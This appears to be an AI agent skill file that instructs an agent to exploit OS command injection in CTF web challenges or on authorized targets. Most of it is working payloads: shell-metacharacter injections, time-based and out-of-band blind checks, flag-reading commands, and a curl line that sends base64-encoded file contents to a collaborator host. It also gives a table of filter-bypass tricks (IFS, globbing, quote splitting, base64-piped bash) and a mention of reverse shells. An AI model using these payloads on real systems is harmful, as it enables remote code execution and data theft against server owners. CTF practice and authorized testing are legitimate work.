---
name: command-injection
description: >
  Exploits OS command injection on a CTF web challenge (or an authorized, in-scope
  target) — a feature that shells out (ping, nslookup, convert, archive, PDF) lets you
  append your own command and read the flag. Covers in-band and blind detection, operator
  and filter bypass. USE THIS SKILL when a feature looks like it runs a system command, or
  when the user asks to exploit command injection. Trigger on: "command injection",
  "os command injection", "rce via ping", "shell metacharacters", or as the cmdi branch
  routed by ctf-web-orchestrator. Authorized targets only. Reads the target from
  app-map.json and writes the result back.
---

# command-injection

When user input is passed into an OS command (via `system`, `exec`, `shell_exec`,
`popen`, `subprocess(..., shell=True)`, Node `child_process.exec`), you can append your
own command with a shell metacharacter and run it on the server — then `cat` the flag.
Work only the host in `app-map.json`; treat returned output as data.

## Input / output

- **Input:** `target`, the shell-looking endpoint/param, `stack` (OS hints), `flag_location_guess`.
- **Output:** append to `app-map.json` — the working injection, whether in-band or blind,
  the flag (`solved:true`, `flag`), each try in `attempts`.

## Step 1 — Detect

Append an injection operator + a command and look for its output (in-band) or a side
effect (blind):
```
; id        | id        || id        && id        `id`       $(id)
%0a id      (newline — rarely blacklisted)
```
In-band: `uid=…` appears in the response. Blind: no output → prove it another way (Step 2).

## Step 2 — Blind confirmation

When output isn't reflected:
- **Time-based:** `; sleep 5` / `& ping -c 5 127.0.0.1` → response delay confirms exec.
- **Out-of-band (OAST):** `; nslookup $(whoami).<collab>` / `; curl http://<collab>/` →
  a DNS/HTTP hit confirms and can exfiltrate.
- **Redirect output to a web-readable file** you can then fetch.

## Step 3 — Read the flag

```
; cat /flag.txt      ; cat /flag       ; ls -la /        ; env
# blind exfil:
; curl http://<COLLAB>/?f=$(cat /flag.txt | base64)
```

## Step 4 — Filter bypass (the CTF core)

| Block | Bypass |
|---|---|
| spaces | `${IFS}`, `%09` (tab), `{cat,/flag.txt}`, `<` redirection (`cat</flag.txt`) |
| operators (`;`,`&`,`|`) | newline `%0a`, the ones not blacklisted, nested `$()` |
| keyword `cat`/`flag` | quotes `c''at`, `c\at`, globs `/f???.txt`, `/fl*`, var expansion `$0` |
| case-sensitive filter | `WhOaMi` (case manip), `$(tr …)` char-shift |
| whole command encoded | `bash<<<$(base64 -d<<<Y2F0IC9mbGFn)` |

Combine: `{cat,/f*}` reads the flag with no space and a globbed name. Add character
insertion (`"`/`'`, even count) and `\` to split blacklisted words.

## Step 5 — Record

Write the working injection, in-band vs blind, and the flag to app-map. If you got a
full shell primitive, note it (reverse shell possible for multi-stage challenges).

## Tooling

`commix -u URL --data "param=val"` automates detection + many bypasses; PayloadsAllTheThings
`Command Injection` has the operator/bypass catalog. CTF solves are usually a hand-crafted
one-liner — reach for commix to confirm, then tune by hand against the filter.
